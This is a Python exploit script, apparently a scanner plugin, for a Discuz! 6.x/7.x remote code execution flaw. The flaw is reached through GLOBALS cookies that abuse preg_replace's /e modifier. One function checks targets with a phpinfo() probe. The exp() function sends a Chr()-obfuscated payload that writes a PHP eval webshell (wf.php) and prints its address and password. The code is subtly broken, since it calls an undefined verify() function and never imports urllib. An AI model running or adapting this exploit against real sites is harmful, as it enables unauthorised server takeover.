#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '存在exp函数,可写入木马！',

      'method'    :   'get',

      'bugname'   :   'Discuz!6.x7.x全局变量防御绕过-命令执行',

      'level'     :   'medium',
      'FOFA'      :   '',
      'author'    :   'ppxfx',
      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/viewthread.php?tid=1'
  cookies = {
      "GLOBALS[_DCACHE][smilies][searcharray]": "/.*/eui",
      "GLOBALS[_DCACHE][smilies][replacearray]": "phpinfo()",
      }
  url1 = url + target
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if "discuz" in res.text:
      res2 = requests.get(url=url1,headers=headers,cookies=cookies,timeout=5,verify=False)
      if 'PHP Version' in res2.text:
        ret['url'] = url1
        ret['ifbug'] = True
        res.close()
        return ret
      else:
        return ret    
    else:
      return ret
  except:
    return ret
def exp(url):
  try:
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
    }
    cookies = {
        "GLOBALS[_DCACHE][smilies][searcharray]": "/.*/eui",
        "GLOBALS[_DCACHE][smilies][replacearray]": "eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(119).Chr(102).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(108).Chr(97).Chr(108).Chr(97).Chr(108).Chr(97).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59))",
    }
    relsult = verify(url)
    if relsult['vulnerable']:
      vurl = relsult['vurl']
      print('[+] 正在写入木马 ......')
      rep2 = requests.get(vurl, headers=headers, cookies=cookies, timeout=5)
      webshell = urllib.parse.urljoin(url, 'wf.php')
      verify_rep = requests.get(webshell, timeout=5)
      if rep2.status_code == 200 and verify_rep.status_code == 200:
        print('[+] 文件写入成功!')
        print('[*] webshell地址(蚁剑): ', webshell)
        print('[*] 密码: lalala')
        return True
      return False
    else:
      return False
  except:
    return False